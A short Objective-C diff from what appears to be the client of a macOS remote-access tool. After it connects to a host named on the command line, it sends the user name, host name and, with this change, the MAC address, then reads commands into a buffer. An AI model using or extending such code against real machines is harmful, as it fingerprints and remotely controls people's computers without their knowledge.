@@ -36,7 +36,7 @@ int main(int argc, const char * argv[]) {
         NSLog(@"couldnt establish connection %s %s %s",argv[1],argv[2],argv[3]);
     }
     else {
-        NSString *name = [NSString stringWithFormat:@"%@@%@",NSUserName(),[[NSHost currentHost] localizedName]];
+        NSString *name = [NSString stringWithFormat:@"%@ %@@%@",[_espl GetMACAddressDisplayString],NSUserName(),[[NSHost currentHost] localizedName]];
         [_espl sendString:name];
         NSString *command;
         char buffer[2048];
